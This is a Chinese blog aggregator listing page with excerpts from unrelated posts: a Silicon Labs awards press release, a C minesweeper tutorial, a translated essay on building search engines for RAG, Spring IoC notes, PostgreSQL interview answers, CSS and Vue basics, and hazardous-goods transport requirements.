Silicon Labs（亦称“芯科科技”）日前在全球半导体联盟（Global Semiconductor Alliance，GSA）举行的颁奖典礼上，再次荣获最受尊敬上市半导体企业奖，这是公司第七度被授予该奖项。此外，芯科科技在2023年也凭借为物联网市场提供的高性能、超低功耗、高安全性、智能化的无线连接产品和解决方案，获得来自国内外媒体、联盟和其他行业组织机构颁发的十余个企业及产品类奖项。
芯科科技在2023年获得多项殊荣，得到业界的广泛关注和认同，这得益于我们的技术广度和深度，卓越的企业管理和发展理念，以及对物联网的专注度。我们可以向业界提供涵盖硬件产品、软件工具、安全功能和支持服务的全面解决方案，帮助开发人员轻松解决产品生命周期中复杂的无线挑战。面向当前和未来的需求，芯科科技专为嵌入式物联网设备打造的第三代无线开发平台，未来可为业界提供领先的计算能力和更强的安全性。同时，我们最新的开发套件Simplicity Studio 6也将为开发人员提供其所需的工具和灵活性。
芯科科技在2023年获得的企业类奖项
荣获“GSA全球最受尊敬上市半导体企业奖（年营业额在10亿至50亿美金之间）”荣获电子发烧友（Elecfans.com）网站的2023年度中国IoT创新奖之“IoT市场突破表现企业奖”荣获AspenCore的2023全球电子成就奖（World Electronics Achievement Awards，WEAA）之“年度最具潜力物联网技术企业奖”荣获2023 Matter中国区开发者大会首届“Matter优秀赋能者奖”荣获2023年亚洲金选奖（EE Awards Asia）Taiwan Awards之“金选AIoT解决方案供应商”企业奖 芯科科技拥有业界最全面的无线产品组合，支持最多样化的无线通信协议，包括蓝牙、Matter、Thread、Wi-SUN、Wi-Fi、Zigbee、Z-Wave和专有协议等。目前，芯科科技已基于自己的第二代无线开发平台推出了满足不同无线协议与多协议需求的SoC和模块产品，如MG、BG、FG、ZG、SG等系列，并正在开发基于22纳米（nm）工艺制程的第三代无线开发平台，旨在为智能家居、智慧城市、工业和商业物联网、互联健康等应用领域提供更加性能高效、安全可靠的产品。
芯科科技在2023年获得的产品类奖项
支持Amazon Sidewalk的Pro Kit专业套件荣获嵌入式计算设计（Embedded Computing Design）的开发工具类“最佳产品奖”；SiWx917 SoC荣获无线连接类“最佳产品奖”FG25 Sub-GHz SoC在2023国际AIoT生态发展大会同期举办的新一代信息通信技术（NICT）创新奖上荣获“年度创新技术产品奖”MG24多协议无线SoC在2023广州国际照明展览会上荣获阿拉丁神灯奖数智奖之“全屋智能数智产品创新奖”BG24系列蓝牙SoC荣获电子产品世界（EEPW）的十大划时代半导体产品奖之“无线连接芯片类奖”BG27蓝牙和MG27多协议无线SoC系列在OFweek 2023（第八届）物联网产业大会上荣获维科杯·OFweek 2023物联网行业创新技术产品奖之“芯片技术突破奖”BG27蓝牙和MG27多协议无线SoC荣获工程成就计划领导奖（Leadership in Engineering Achievement Program Awards，LEAP Awards）之嵌入式计算类铜奖BG27蓝牙和MG27多协议无线SoC荣获2023年亚洲金选奖（EE Awards Asia）Taiwan Awards之“年度最佳RF/Wireless IC”产品奖；MG24多协议无线SoC荣获创新奖BG27蓝牙和MG27多协议无线SoC荣获2023年亚洲金选奖（EE Awards Asia）Asia Awards之“年度最佳RF/Wireless IC”产品奖；FG28双频Sub-GHz和2.4GHz低功耗蓝牙SoC荣获“金选绿色科技公司（Best Green Tech Supplier）”人气奖FG28双频Sub-GHz和2.4GHz低功耗蓝牙SoC在中国AIoT产业年会上荣获2023 AIoT新维奖之“技术突破奖” 芯科科技在2023年获得的奖项提名
BG27蓝牙SoC获得Elektra Awards“最佳产品设计奖”和“年度物联网产品奖”提名 这些奖项体现了业界对芯科科技企业发展和产品创新的高度认可，进一步坚定了芯科科技不断开拓并追求卓越的信心。作为深耕物联网领域多年的无线连接解决方案供应商，芯科科技致力于打造将嵌入式系统连接到互联网的无线芯片和软件，力求从半导体和连接性两个方面以更低的成本提供更加卓越的技术，从而支持物联网设备实现规模扩展和多样性发展。未来，芯科科技将继续推动技术演进和产品创新，不断优化和扩展支持与服务能力，助力客户加快产品上市，进而推动行业变革、促进经济增长并改善人们的生活质量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5282c16b37a0c47f0aabd4294e9ff73e/" rel="bookmark">
			扫雷----超详解&#43;完整原码（扩展版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		💓博客主页：江池俊的博客
⏩收录专栏：C语言初阶之路
💻代码仓库：江池俊的代码仓库
✉️每一次努力都是一次进步，每一次尝试都是一次机会。无论遇到什么困难，都要坚定地向 前迈进。相信自己，并相信自己的潜力，您注定会取得非凡的成就！
🍁 如果觉得博主的文章还不错的话，请点赞👍收藏🌟 三连支持一下博主💞
🔥编译环境：Visual Studio 2022
目录
一、游戏介绍
游戏规则： 游戏玩法：
二、游戏实现思路 三、创建文件
1.test.c文件 😆（menu）菜单函数的实现
😆game函数的实现
😆main函数的实现
2.game.c文件
😊书写初始化棋盘函数
😊书写打印棋盘信息的函数
😊书写设置雷的函数（是雷则为‘1’）
😊书写统计周围雷个数的函数
😊书写展开一片非雷区域的函数
😊书写计算非雷和非标记的位置个数
😊书写排查雷的函数
3.game.h文件
😄需要使用的头文件
😄定义棋盘行列
😄定义雷的个数
😄初始化棋盘
😄打印棋盘
😄布置雷
😄排查雷
四、总代码 （一）game.h文件
（二）game.c文件 （三）test.c文件
五、效果展示
前言 本篇文章主要是讲解用C语言实现扫雷游戏，与三子棋的实现思路类似，可以参考我前面的两篇文章：三子棋小游戏 猜数字小游戏
下面我们回归正题，让我来详细讲解如何实现扫雷游戏。
这里我们以9*9的网格为例。
一、游戏介绍 扫雷是一款经典的单人益智游戏，目标是在一个由方格组成的区域中找到并标记出所有的地雷，同时避免触雷。下面是扫雷游戏的网页链接，你可以通过玩下方的游戏加深自己对游戏的逻辑和原理的理解。
扫雷游戏网页版 - Minesweeper
上面依次是游戏进行、失败和胜利的界面 。
游戏规则： 1.游戏开始时，整个区域被分割成一系列方格，其中一些方格中隐藏有地雷。
2.方格可以是未被揭开的状态，也可以是已被揭开或标记过的状态。
3.点击一个方格可以揭开它，如果该方格中没有地雷，则会显示数字，表示周围8个方格中地 雷的数量。
4.如果揭开的方格没有地雷数量，则会自动会揭开周围相邻的空方格。
5.如果揭开的方格中有地雷，游戏结束，玩家失败。
游戏玩法： 1.目标是找到并标记出所有的地雷，而不触雷。
2.揭开方格时，根据方格周围的地雷数量，判断周围的方格是否安全。数字表示周围有多少颗地雷。
3.如果您确定某个方格中有地雷，可以标记该方格为雷。这有助于您记住哪些方格是地雷，也可以帮助您避免不小心触雷。
4.使用推理和逻辑来判断哪些方格一定是地雷，哪些方格一定是安全的。通过标记地雷并推断周围的数字，逐渐揭开更多的方格，直到找到所有的地雷。
二、游戏实现思路 1.创建游戏棋盘：使用二维数组表示游戏棋盘，每个格子可以是开放状态、地雷或者标记状态。
2.随机布雷：使用随机数生成地雷的位置，并在对应位置上设置地雷。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5282c16b37a0c47f0aabd4294e9ff73e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40a81d301a691425fddf2a9f9a44f8b6/" rel="bookmark">
			构建搜索引擎，而非向量数据库（Vector DB） [译]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文：Build a search engine, not a vector DB 作者：
Panda Smith
在过去 12 个月中，我们见证了向量数据库（Vector DB）创业公司的迅猛增长。我此刻并不打算深入探讨它们各自的设计取舍。相反，我更想探讨和解释一些关于向量数据库的常见理解——它是什么、它的功能用途，以及在解决问题时，我们应如何恰当地利用向量数据库。
向量数据库不等于存储器 很多向量数据库的主要作用被描述为解决大语言模型 (LLM) 缺乏长期记忆的问题，或者无法将一个问题的全部上下文放入提示语中。
Chroma raises $18M seed round
然而，向量搜索实质上只是搜索的一种特殊形式。虽然让大语言模型 (LLM) 能够写入和检索数据库非常有用，但最终这更像是提供给智能体一个搜索引擎的权限，而非真正“增加了存储空间”。
假设你是一家企业，想要建立一个由 LLM 驱动的文档查询体验。如果你将向量数据库仅看作是为语言模型提供更多存储空间，那么你可能会把公司的所有产品文档都嵌入其中，然后让用户向你的机器人提问。用户按下回车键时，系统会对他们的查询进行向量搜索，找到相关片段，加载到上下文中，然后让语言模型尝试回答问题。实际上，这正是我在 Stripe 工作时，开发他们的 AI 文档产品 时最初尝试的方法。
但我最终发现，这种方法并不理想。关键在于，尽管向量搜索在某些方面优于传统搜索，但它并非万能。就像常规搜索一样，你可能会在搜索结果中遇到不相关或遗漏的文档。语言模型，就像人类一样，只能利用它们所拥有的信息，而这些不相关的文档很可能会导致误导。
如果你想打造一个优秀的基于文档的 RAG 工具，你首先应该构建一个足够优秀的搜索引擎，让人类也能轻松使用。这可能是你们组织之前已经考虑过的，如果尚未实现，那是因为打造一个高效的搜索引擎通常是一项颇具挑战的工作。
好消息 当你坐下来打算构建一个高效的搜索系统时，你该如何下手呢？在这个问题上，大语言模型 (LLM) 可以成为你的救星。
虽然嵌入技术 (Embeddings) 并非灵丹妙药，但它们的确令人惊叹。相比于关键词搜索，高质量的嵌入式搜索能显著降低假阴性的比率。而将嵌入式搜索与关键词搜索结合使用，其性能远胜于任何纯文本搜索。事实上，谷歌多年来一直在这方面利用 [BERT](https://blog.google/products/search/search-language-understanding
-bert/?ref=blog.elicit.com) 技术。此外，嵌入技术本身及其在大规模搜索中的应用工具已经得到了巨大的改进。市面上有许多经过实战检验的数据库能够结合关键词和向量搜索，我强烈建议使用这些数据库之一（例如在 Elicit 我们使用 Vespa，而像 Chroma 这样的向量数据库现在通常也支持这一功能）。
在将嵌入技术与传统方法结合以改善整体搜索之后，你将迎来一些真正有趣的挑战。一个精于搜索技巧的用户知道如何构造查询以确保找到相关信息（曾有一时期，Google-fu（高效使用谷歌的技巧）被视为一种强大的技艺），语言模型也能做到这一点。例如，如果你的模型想寻找“疟疾疫苗最新动态”，你可以让它构建一个包含日期过滤器的查询语句。这里充满了尚未开发的潜力，而且在此基础上，通过无穷无尽的微调，可以实现令人惊叹的高质量搜索。就像在其他许多情况下一样，虽然在大语言模型出现之前这些都是可能实现的，但它们需要大量的专业技能和努力。现在，你只需几小时的时间和一些计算资源，就能实现有竞争力的性能。
在传统搜索流程中，最后一个阶段通常是重新排序（re-ranking）。过去，要实现重新排序，我们需要基于用户在特定搜索结果页面的点击行为等信号训练一个相关性模型，然后用这个模型对首要结果进行排序。对于没有专门团队来构建搜索引擎的人来说，这是一个难以解决的问题。但现在，借助于语言模型（language models），你可以向模型提供查询与结果之
间的细节信息，从而获得一个相关性评分，这种评分甚至能超越大多数专业定制的系统。
归根结底，AI 的最新进展极大地简化了构建先进搜索引擎的过程，比起以往，所需的努力大幅减少。因此，投入时间和精力来认真打造高效的搜索引擎，所带来的回报是极其可观的。
如果你打算开发一个基于 RAG 的工具（RAG-based tool），那么首先需要着手构建搜索功能。
附言（不太好的消息） 你已经利用上述技术成功构建了一个优秀的搜索引擎，接下来就是部署的时刻了。然而，遗憾的是，语言模型并不能帮你解决搜索引擎建设的另一大挑战：评估问题。
具体来说，这包括能够解答以下问题：
“在何种情况下进行搜索是恰当的？”“当你进行搜索时，你真正想找到的内容是什么？”“这些内容在搜索结果中的排名有多高？” 要回答这些问题，你需要构建一套评估和监控系统，通过这套系统来对你的搜索流程进行迭代优化，并判断所做的更改是否真正带来了提升。关于如何评估搜索引擎的更多内容，我推荐阅读这一系列精彩的博文。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2632985542e3e99088213543e77cddf8/" rel="bookmark">
			Spring IoC&amp;DI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言什么是Spring1. 什么是 IoC 容器1.1 什么是容器1.2 什么是 IoC 2. 什么是DI IoC &amp; DI 的使用IoC详解Bean的存储@Controller注解如何获取Bean1. 根据Bean的名称获取Bean2. 根据Bean类型获取Bean3. 根据Bean名和Bean类型获取Bean @Service注解@Repository注解@Component注解@Configuration注解为什么会有这么多类注解方法注解重命名Bean扫描路径 DI 详解1. 属性注入构造方法注入Setter 注入三种注入的优缺点Autowired 存在的问题 前言 前面我们大概知道了什么是 Spring，以及 Spring 家族中 Spring Boot 和 Spring MVC的开发，但是 Spring 到底是什么呢？
什么是Spring 前面我为大家简单介绍了什么是 Spring 【Spring】什么是Spring，不过前面的介绍较为简单，要想知道Spring 的原理，这些知识不不足以帮助我们了解 Spring 的，所以这篇文章我将详细为大家介绍什么是 Spring。
通过前面的学习，我们知道了 Spring 是一个开源的框架，它让我们的开发变得更加简单，它支持广泛的应用场景，有着活跃而庞大的社区，这也是 Spring 能够经久不衰的原因。
但是这个概念对于我们来说，还是太抽象了，用一句话概括：Spring 是包含了众多工具的 IoC 容器。那么什么是 IoC 容器呢？
1. 什么是 IoC 容器 1.1 什么是容器 容器是指能够容纳某种物品的装置。在生活中，储物箱、垃圾桶、冰箱等这些都属于容器，而在计算机中，我们前面学习的List/map就是数据存储的容器，Tomcat就是Web容器。
1.2 什么是 IoC IoC 是 Spring 的核心思想。
IoC是Inversion of Control的缩写，多数书籍翻译成“控制反转”。1996年，Michael Mattson在一篇有关探讨面向对象框架的文章中，首先提出了IoC这个概念。对于面向对象设计及编程的基本思想，简单来说就是把复杂系统分解成相互合作的对象，这些对象类通过封装以后，内部实现对外部是透明的，从而降低了解决问题的复杂度，而且可以灵活地被重用和扩展。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2632985542e3e99088213543e77cddf8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/399bd1ee587245ecac6f39beaa99886f/" rel="bookmark">
			PostgreSQL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 请解释PostgreSQL中的WAL（Write-Ahead Logging）机制。 WAL（Write-Ahead Logging）机制是PostgreSQL数据库中用于确保数据持久性和事务原子性的一种技术。它通过在将数据写入磁盘之前先将更改记录到预写日志（Write-Ahead Log，简称WAL）文件中来实现这一目标。
WAL机制的主要优点如下：
数据持久性：当数据库崩溃时，可以通过重放WAL文件中的更改来恢复数据。这确保了数据的持久性，因为即使在系统崩溃的情况下，也不会丢失任何未写入磁盘的数据。
事务原子性：WAL机制确保了事务的原子性。在一个事务执行过程中，所有的更改都会先被记录到WAL文件中，然后再应用到数据库中。如果事务在执行过程中发生错误，可以回滚整个事务，而不会留下部分已提交、部分未提交的数据。
性能优化：由于WAL机制允许在后台异步地将更改写入磁盘，因此可以减轻磁盘I/O的压力，提高数据库的性能。此外，通过使用多线程和多进程来并发处理多个WAL文件，还可以进一步提高性能。
可扩展性：WAL机制使得PostgreSQL可以轻松地扩展到多个节点的集群环境中。每个节点都可以独立地处理其自己的WAL文件，从而实现负载均衡和故障容错。
总之，WAL机制是PostgreSQL数据库中一种关键的技术，它确保了数据持久性、事务原子性以及高性能和可扩展性。
2. 请解释PostgreSQL中的MVCC（多版本并发控制）机制。 MVCC（多版本并发控制）机制是PostgreSQL数据库中的一种关键技术，它允许多个事务同时访问同一数据，而不会产生冲突。以下是关于MVCC机制的详细解释：
在PostgreSQL中，每个表都有一些隐藏的系统字段，包括：xmin、xmax、cmin和cmax。这些字段用于追踪表中的数据变化。
当一个事务开始时，PostgreSQL会为该事务创建一个新的历史记录。这个历史记录包含了该事务中所有将要执行的读写操作。
在事务执行过程中，每当有数据被读取或修改时，PostgreSQL会创建一个新的数据版本。这样，即使在事务执行过程中发生系统崩溃或其他故障，也可以通过回放历史记录中的操作来恢复数据。
如果两个或更多的事务试图同时修改同一条记录，PostgreSQL会使用乐观锁定协议来处理冲突。在这种情况下，只有一个事务能够提交其更改，其他事务将被回滚。
当事务结束时，PostgreSQL会将该事务的所有历史记录删除。如果一个事务在执行过程中发生了错误，PostgreSQL可以选择回滚该事务。在这种情况下，该事务的所有历史记录都将被丢弃，数据库将恢复到事务开始之前的状态。
3. 请解释PostgreSQL中的事务和锁的概念。 在PostgreSQL中，事务是一个不可分割的工作单位，用于完成一系列相关的数据库操作。这些操作包括数据的读取、修改以及其他各种数据库命令。所有的这些操作都被视为一个整体，要么全部成功执行，要么如果其中任何一个失败，则所有的操作都将被撤销，数据库将返回到初始状态，这就是所谓的原子性或一致性。
为了确保事务的正确执行和数据的一致性，PostgreSQL采用了锁机制。锁是一种控制多个事务同时访问相同数据资源的方法。在PostgreSQL中，主要提供了表级锁和行级锁来控制对表中数据的并发访问。除此之外，还有页级锁等其他类型的锁模式。每种锁都有自己的冲突集合，并且有自己的获取和释放机制。例如，表级锁会在同一时刻阻止两个事务对同一表进行互相冲突的操作，但是可以允许两个事务同时对同一个表进行不冲突的操作。
事务的开始由BEGIN命令标识，而COMMIT命令则用来标识所有事务元素（即数据库操作）的完成，使得这些完成的事务或子事务的结果持久化并对外部可见。如果在事务处理过程中出现问题，可以使用ROLLBACK命令回滚到事务开始之前的状态，就像什么都没发生过一样。此外，还可以使用SAVEPOINT命令在事务中间设定一个保存点，如果需要回滚，就可以回滚到这个特定的保存点。
4. 请解释PostgreSQL中的索引类型及其优缺点。 PostgreSQL支持多种索引类型，包括B-树（BTREE）、哈希（HASH）、GiST、SP-GiST、GIN和BRIN。这些索引类型的选择主要取决于数据的特性以及查询的需求。
B-树索引是PostgreSQL最常用的索引类型，适用于各种查询类型。它是一种自平衡树，能够按顺序存储数据，并支持对数时间复杂度（O(logN)）的搜索、插入、删除和顺序访问。例如，如果数据量为100条时需要1次磁盘I/O，那么当数据量增至10000条时，只需要2次I/O，同样，当数据量达到1亿条时，只需4次I/O。然而，B-树索引不适用于多维数据类型和集合数据类型。
哈希索引则适用于等值查询频繁的情况，具有极高的查询速度。然而，它只支持等值查询，对于范围查询和排序查询等复杂查询，其效率可能较低。
GiST（Generalized Search Tree）索引是一种基于R-tree的索引类型，适用于多维数据类型和集合数据类型。与B-tree索引相比，GiST多字段索引在查询条件中包含索引字段的任何子集都会使用索引扫描。这使得GiST索引特别适合处理地理空间数据等特殊数据类型。
SP-GiST和GIN索引也是为特定数据类型设计的，如全文搜索和IP地址查找等。
总的来说，每种索引都有其适用的场景和优缺点，用户应根据实际需求选择合适的索引类型。
5. 请解释PostgreSQL中的分区表和分片表的概念及其应用场景。 分区表和分片表都是数据库中的数据分散存储技术，不过在实现方式和应用场景上存在差异。分区表是将一个大表依据一定规则拆分成多个子表，每个子表存储其中一部分数据，这样可以减轻单个表的数据量，提升查询效率，避免因表过大而导致的性能问题。
PostgreSQL中的分区表有两种形式，声明式分区和继承式分区。从PostgreSQL 10版本开始支持声明式分区，它通过直接定义分区策略将数据分散到不同的子表中，并通过父表建立关联关系，从而实现数据物理上的分区。而继承式分区是PostgreSQL 10版本以前主要使用的方式，需要用户编写和维护一些代码，包括创建父表、子表、约束、索引以及触发器等。
相较于分区表，分片表则是将一个表的记录按照一定的规则分散到多个服务器或多个数据库中存放，以实现数据的分布式存储和负载均衡。分片表的主要目标是解决单一服务器无法承受的数据量压力，适用于数据量大、需要高并发读写操作的应用场景。
6. 请解释PostgreSQL中的并行查询和并行执行的概念。 在PostgreSQL中，并行查询是一种策略，用于同时执行多个查询以加快查询速度。这种技术利用了现代多核CPU的优势，将数据分散到多个CPU内核上进行处理。并行查询的实现依赖于任务级别的并行，将原先的执行计划垂直拆分成几个可以分离的子任务。该技术的关键在于优化器，当它认为并行查询是最优策略时，会创建一个包含Gather或Gather Merge节点的执行计划。
然而，并行查询并非所有情况下都能提升性能。例如，对于那些需要检索大量数据但只返回少数几行的查询，性能提升可能并不明显。此外，由于并行化引入了新的复杂性，如数据同步和资源竞争等问题，因此在大数据量时，并行度可能不足，甚至可能导致性能下降。
另一方面，并行执行则涉及到数据库操作的执行方式。在PostgreSQL中，并行执行意味着在同一时刻执行多个操作，以提高处理效率。这通常应用于诸如排序和聚合等需要大量计算的操作。然而，值得注意的是，尽管并行执行可以提高处理效率，但由于并发操作之间的资源竞争和数据同步等问题，可能会增加系统的复杂性和潜在的错误风险。
7. 请解释PostgreSQL中的连接池和会话管理。 在PostgreSQL中，连接池是一种数据库连接管理技术，其目的在于减少建立和断开数据库连接的开销，以此来提高数据库访问性能。应用通过从连接池中获取连接来与数据库进行交互，使用完毕后再将连接归还给连接池。这样可以避免频繁地开启和关闭数据库连接所带来的资源消耗，特别是在处理大量并发请求的情况下，能够显著提升系统的整体性能。
一个典型的例子是PgBouncer，这是一个专为PostgreSQL设计的高效连接池程序，它在管理多个客户端与一个或多个数据库之间的连接方面具有降低处理时间和优化资源使用的优势。此外，pgpool-II和JDBC客户端连接池也是PostgreSQL常用的连接池工具。
会话管理则是指对数据库会话进行监控和管理的过程，包括会话的创建、维护和终止等操作。在应用程序与数据库之间建立良好的会话管理机制，可以有效地提高应用程序的运行效率和稳定性。
8. 请解释PostgreSQL中的备份和恢复策略。 在PostgreSQL中，备份和恢复策略是关键的数据库维护任务，主要有以下几种方式：
逻辑备份与还原：逻辑备份是将数据库的结构和数据导出为SQL文件，然后可以通过恢复操作将这些SQL文件导入到数据库中。执行逻辑备份时，PostgreSQL服务器必须已经启动，备份工具（例如pg_dump）通过建立数据库连接，从数据库中查询出相应的结构信息和数据，并生成备份文件。
物理备份与恢复：物理备份则是直接复制数据库的文件系统，以实现数据的备份和恢复。物理备份又可以分为离线备份（也称为冷备份）和在线备份。离线备份通过文件系统级别的复制备份数据库（如/data目录），而在线备份则在数据库运行期间进行。
备份大型数据库：对于大型数据库，备份和恢复操作可能会面临两个问题：备份文件过大，或者操作时间过长。此时，可以采用并行备份和恢复来加快备份和恢复的速度。
备份单个数据库或整个集群：PostgreSQL提供了备份单个数据库的工具pg_dump，也可以使用它来备份整个集群。但需要注意的是，pg_dump每次只导出一个数据库，而且它不会导出角色或表空间（属于集群范围）相关的信息。
9. 请解释PostgreSQL中的性能调优方法，如调整内存、CPU、磁盘等资源。 PostgreSQL的性能优化通常包括找出系统的瓶颈，提高数据库整体的性能，合理的结构设计和参数调整PostgreSQL的性能优化通常包括找出系统的瓶颈，提高数据库整体的性能，合理的结构设计和参数调整以提高用户操作响应的速度，以及尽可能节省系统资源以便系统可以提供更大负荷的服务。以下是一些具体的性能调优方法：
调整内存和CPU资源：通过增加或减少内存和CPU的使用量，可以有效地控制PostgreSQL的运行效率。这需要根据具体硬件配置和应用需求来进行设置。
调整磁盘I/O：通过调整磁盘I/O，可以提高PostgreSQL的读写效率。例如，可以通过使用SSD硬盘或者增加硬盘缓存来提高磁盘I/O性能。
调整数据库参数：通过修改PostgreSQL的配置文件或者使用ALTER SYSTEM命令，可以改变数据库的行为并提高其性能。例如，可以根据系统的实际负载情况调整max_connections参数（最大连接数），因为不必要的连接会产生内存成本。
查询优化：找出系统中缓慢和长期运行的查询，然后对其进行优化，可以提高整个数据库的性能。例如，可以通过使用pg_stat_activity目录表来找到这些查询。
使用工具进行调优：例如，可以使用pgtune工具进行参数调优。此外，还可以通过测试和比较不同的配置设置，如full_page_writes选项，来确定最佳的性能配置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/399bd1ee587245ecac6f39beaa99886f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/171b8aab582378116d471b9e69aee0bb/" rel="bookmark">
			引领创新潮流，武汉灰京文化开创游戏行业新推广标杆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为市场引领者，武汉灰京文化通过多渠道、多维度的市场推广手段，不仅助力游戏产品广泛传播，更为整个游戏行业树立了新的推广标杆。公司的成功经验为其他游戏发行商提供了有力的借鉴，推动了行业向更创新、更多元的方向发展。
引领者的多渠道推广策略 武汉灰京文化凭借其市场引领地位，以多渠道推广为核心战略。通过社交媒体、短视频平台、直播等多个渠道，公司成功将游戏产品传达到更广泛的用户群体中。这种全方位的推广策略不仅令游戏在市场中广受关注，更为其他游戏发行商提供了一个成功的典范。
多维度市场推广手段的成功运用 公司通过多维度的市场推广手段，深度挖掘不同渠道的潜力，取得了显著的成功。社交媒体的精准投放、短视频平台的创意制作、直播平台的互动活动，这些多维度推广手段相互配合，使得游戏在市场中的曝光度和用户点击率得以全面提升。武汉灰京文化通过这种多维度的推广手段，成功吸引了更多用户的关注，树立了市场引领者的形象。
为整个游戏行业树立新的推广标杆 武汉灰京文化通过其成功的市场推广经验，为整个游戏行业树立了新的推广标杆。公司以创新为导向，不断尝试并成功运用新颖的推广手段，给行业带来了新的启示。其他游戏发行商纷纷效仿，将武汉灰京文化的成功经验视为学习的范本，使得整个游戏行业的推广水平不断提升。
为其他游戏发行商提供有力借鉴 作为市场引领者，武汉灰京文化为其他游戏发行商提供了有力的借鉴。公司成功的推广经验不仅在业内引起了广泛关注，更成为其他企业学习的典范。通过借鉴武汉灰京文化的成功经验，其他游戏发行商能够更好地理解市场需求，提高推广效果，实现更好的商业表现。
推动游戏行业向更创新、更多元的方向发展 武汉灰京文化的成功不仅为自身带来了商业利益，更推动了整个游戏行业向更创新、更多元的方向发展。公司通过创新的推广手段，为行业注入了新鲜血液，激发了更多创新的灵感。这种推动作用使得游戏行业呈现出更加多元化的发展趋势，从而更好地满足了不同用户群体的需求。
结合社会趋势，实现市场引领者的责任 武汉灰京文化在成为市场引领者的同时，也充分意识到其责任。公司在推广中结合社会趋势，关注用户需求，推动行业更好地服务于社会。通过引领创新潮流，武汉灰京文化为游戏行业树立了良好的企业形象，赢得了用户的信任与认可。
作为市场引领者，武汉灰京文化通过多渠道、多维度的市场推广手段，成功塑造了游戏行业的新推广标杆。公司的成功经验不仅为其他游戏发行商提供了宝贵的借鉴，也推动了整个游戏行业向更创新、更多元的方向发展。这样的市场引领者不仅仅是行业中的成功者，更是为整个产业的繁荣做出了积极贡献。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d24dcd35a767478b061e20da3e4741a/" rel="bookmark">
			VUE中的index.html、App.vue和main.js的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 VUE中的index.html、App.vue和main.js的关系，个人理解。 javascriptCopy code import Vue from 'vue'; import App from './App.vue'; new Vue({ render: h =&gt; h(App), }).$mount('#app'); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26f43f3ece474d6e18991c45ef4eacde/" rel="bookmark">
			CSS中常用的属性及其用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSS（层叠样式表）是一种用于描述网页样式的语言，它定义了网页元素的外观和布局。下面是CSS中常用的属性及其用法：
字体属性： font-family：设置字体样式。font-size：设置字体大小。font-weight：设置字体粗细。font-style：设置字体样式（斜体、正常）。text-decoration：设置文本装饰（下划线、删除线等）。 文本属性： color：设置文本颜色。text-align：设置文本对齐方式。line-height：设置行高。letter-spacing：设置字符间距。text-transform：设置文本大小写转换（大写、小写、首字母大写等）。 边框属性： border：设置边框样式、宽度和颜色。border-radius：设置边框圆角。border-top、border-bottom、border-left、border-right：分别设置上、下、左、右边框样式、宽度和颜色。 背景属性： background-color：设置背景颜色。background-image：设置背景图片。background-repeat：设置背景图像的重复方式。background-position：设置背景图像的位置。 尺寸和定位属性： width：设置元素的宽度。height：设置元素的高度。margin：设置元素的外边距。padding：设置元素的内边距。position：设置元素的定位方式。top、bottom、left、right：设置元素的定位位置。 盒模型属性： box-sizing：设置元素的盒模型。display：设置元素的显示方式。 列表属性： list-style-type：设置列表项的标记类型。list-style-image：设置列表项的标记图片。list-style-position：设置列表项标记的位置。 动画和过渡属性： transition：设置元素的过渡效果。animation：设置元素的动画效果。 这只是CSS中的一些常用属性和用法，还有更多的属性和用法可以根据实际需求进行学习和应用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98c3f8d0fcd1e9f473783c5e3ea44f14/" rel="bookmark">
			危险品内陆运输相关知识_箱讯科技
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		危险品拖车
危险品拖车运输是一项涉及到高度危险物质的专业工作，需要确保合法合规的运输，并提供必要的信息以保障公共安全。进行这类运输时，需要携带一系列文件和具备特定的资质。
什么样的车适合做危险品拖车?
1、车辆类型：通常情况下，危险品运输的拖车需要是专门设计和适用于危险品运输的车辆。这些车辆可能包括危险品罐车、危险品集装箱拖车等，取决于所运输的具体危险品和运输方式。
2、车辆技术规格：车辆需要符合相关的技术规格，包括车辆的结构、材料、制动系统、悬挂系统等方面的要求。这些规格通常由交通运输管理部门或相关的监管机构制定。
3、装载和卸载设备：拖车上可能需要配备特殊的装载和卸载设备，以确保危险品的安全装卸。
4、标识和标志：拖车需要正确地标明所运输的危险品类别，并且要有相应的警告标志和标识，以提醒其他道路使用者注意。
5、防护措施：车辆需要配备必要的安全防护设施，包括紧急切断系统、泄漏防护措施等，以应对可能的事故。
6、文件和许可证：进行危险品运输的拖车需要具备相关的运输许可证，并在车辆上携带必要的文件，如危险品运输证书等。
危险品拖车运输所需的文件和资质
运输许可证：由交通运输管理部门或相关监管机构颁发，授权拖车公司进行危险品运输。
危险品运输资格证书：拖车司机和相关工作人员需要获得的证书，证明他们接受了专门的危险品运输培训。
危险品运输证书：详细说明所运输危险品的文件，包括货物的类别、数量、危险性质以及符合的运输规定和标准。通常由危险品发货方提供。
车辆登记证明：证明拖车符合国家和地区的技术规范的文件，包括车辆的制造信息、注册号码等。
司机身份证明：司机的身份证明文件，通常是驾驶执照和身份证。
保险证明：证明拖车公司具备适当的保险，以覆盖潜在的风险和损失。这可能包括责任险和车辆保险。
